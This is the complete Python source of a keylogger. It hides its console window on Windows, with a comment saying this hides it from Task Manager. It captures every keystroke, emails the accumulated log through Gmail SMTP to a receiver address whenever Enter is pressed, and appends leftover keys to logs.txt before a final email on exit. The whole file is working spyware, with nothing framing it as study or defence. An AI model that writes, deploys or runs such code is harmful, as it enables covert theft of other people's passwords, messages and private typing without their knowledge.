import keyboard
import sys
import ctypes
import smtplib

# === HIDE CONSOLE WINDOW ===
#this will hide it from the Task Manager
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# === EMAIL SETTINGS ===
EMAIL_ADDRESS = "YourEmail@gmail.com"
EMAIL_PASSWORD = "here you will have use the password provided by your app (Gmail, in my case) " 
TO_EMAIL = "ReceiverEmail@gmail.com"

keys = []  # List to store keystrokes

def send_email(log_data):
    """ Send captured keystrokes via email."""
    subject = "Keylogger Logs"
    body = f"Captured Keystrokes:\n\n{log_data}"
    email_text = f"Subject: {subject}\n\n{body}"

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, email_text)
        print("Logs sent via email successfully!")  # This is the message that we are going to receive to make sure
        #that our mail was sent
    except Exception as e:
        print(f"Error sending email: {e}") #this is the message that we are going to receive in case of an error


if __name__ == "__main__":
    while True:
        event = keyboard.read_event()
        key = event.name

        if event.event_type == keyboard.KEY_DOWN:
            if key == "esc":  # Stop logging when 'esc' is pressed
                break
                #a funny way to break the program would be: if key == "esc" and "ctrl" and "enter" and "space"
            print(key)  # Debugging (remove in final version)
            keys.append(key)

            # === SEND EMAIL EVERY TIME "ENTER" IS PRESSED ===
            if key == "enter":
                log_data = " ".join(filter(None, keys))  # Convert list to string
                send_email(log_data)  # Send logs via email
                keys = []  # Clear the buffer after sending

    # === SAVE REMAINING KEYS TO FILE ===
    log_data = " ".join(filter(None, keys))
    with open("logs.txt", "a") as f:
        f.write(log_data + "\n")

    send_email(log_data)  # Send final logs before exiting
